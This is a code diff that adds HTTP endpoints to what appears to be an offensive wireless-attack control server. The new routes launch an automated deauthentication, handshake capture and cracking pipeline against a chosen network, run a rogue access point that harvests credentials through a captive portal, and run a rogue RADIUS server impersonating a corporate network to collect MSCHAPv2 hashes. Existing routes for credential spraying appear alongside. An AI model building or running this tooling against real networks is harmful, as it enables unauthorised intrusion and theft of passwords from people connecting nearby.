@@ -470,6 +470,75 @@ async def wifi_capture(bssid: str):
     if not p: raise HTTPException(status_code=404)
     return await p.capture_handshake(bssid)
 
+# ─── OPTION C: Automated deauth → capture → crack pipeline ───────────────────
+class AutoAttackBody(BaseModel):
+    bssid: str
+    clients: Optional[list[str]] = None
+    timeout: int = 90
+
+@app.post("/wifi/auto_attack")
+async def wifi_auto_attack(body: AutoAttackBody):
+    p = plugin_manager.get_plugin("WiFi-Strike")
+    if not p: raise HTTPException(status_code=404, detail="WiFi-Strike plugin not found")
+    asyncio.create_task(p.auto_attack(bssid=body.bssid, clients=body.clients, timeout=body.timeout))
+    return {"status": "auto_attack_launched", "bssid": body.bssid}
+
+# ─── OPTION A/B: Rogue AP (captive portal + transparent bridge) ───────────────
+class RogueAPBody(BaseModel):
+    ssid: str = "Free_WiFi"
+    channel: int = 6
+    iface_ap: str = "wlan0"
+    iface_wan: str = "eth0"
+    mode: str = "portal"
+    gw: str = "10.0.0.1"
+
+@app.post("/rogue_ap/start")
+async def rogue_ap_start(body: RogueAPBody):
+    p = plugin_manager.get_plugin("Rogue-AP")
+    if not p: raise HTTPException(status_code=404, detail="Rogue-AP plugin not found")
+    await p.start(**body.model_dump())
+    return {"status": "rogue_ap_active", "ssid": body.ssid, "mode": body.mode}
+
+@app.post("/rogue_ap/stop")
+async def rogue_ap_stop():
+    p = plugin_manager.get_plugin("Rogue-AP")
+    if not p: raise HTTPException(status_code=404)
+    await p.stop()
+    return {"status": "rogue_ap_stopped"}
+
+@app.get("/rogue_ap/creds")
+async def rogue_ap_creds():
+    p = plugin_manager.get_plugin("Rogue-AP")
+    if not p: raise HTTPException(status_code=404)
+    return {"creds": p.captured_creds}
+
+# ─── OPTION D: Rogue RADIUS (WPA-Enterprise MSCHAPv2 hash capture) ───────────
+class RogueRADIUSBody(BaseModel):
+    ssid: str = "CorpNet"
+    channel: int = 6
+    iface: str = "wlan0"
+    radius_port: int = 1812
+
+@app.post("/rogue_radius/start")
+async def rogue_radius_start(body: RogueRADIUSBody):
+    p = plugin_manager.get_plugin("Rogue-RADIUS")
+    if not p: raise HTTPException(status_code=404, detail="Rogue-RADIUS plugin not found")
+    await p.start(**body.model_dump())
+    return {"status": "rogue_radius_active", "ssid": body.ssid}
+
+@app.post("/rogue_radius/stop")
+async def rogue_radius_stop():
+    p = plugin_manager.get_plugin("Rogue-RADIUS")
+    if not p: raise HTTPException(status_code=404)
+    await p.stop()
+    return {"status": "rogue_radius_stopped"}
+
+@app.get("/rogue_radius/hashes")
+async def rogue_radius_hashes():
+    p = plugin_manager.get_plugin("Rogue-RADIUS")
+    if not p: raise HTTPException(status_code=404)
+    return {"hashes": p.captured}
+
 # ─── CRED SPRAY ──────────────────────────────────────────────────────
 class SprayBody(BaseModel):
     target_ip: Optional[str] = None
